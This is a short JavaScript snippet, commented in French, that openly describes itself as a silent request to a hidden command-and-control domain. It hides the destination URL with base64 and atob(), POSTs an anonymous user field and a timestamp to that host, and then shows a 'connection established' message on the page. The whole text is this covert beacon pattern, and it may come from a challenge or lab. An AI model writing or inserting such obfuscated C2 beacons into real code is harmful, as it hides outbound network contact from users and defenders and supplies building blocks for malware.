// Ce script fait une requête silencieuse vers un domaine C2 caché (obfusqué)
const beaconUrl = atob("aHR0cHM6Ly9jaGFsbHJlcG9kLm9ucmVuZGVyLmNvbS9waW5n");

fetch(beaconUrl, {
  method: "POST",
  body: JSON.stringify({ user: "anonymous", time: Date.now() }),
  headers: {
    "Content-Type": "application/json"
  }
}).then(() => {
  document.getElementById("status").textContent = "✅ Connexion établie.";
});
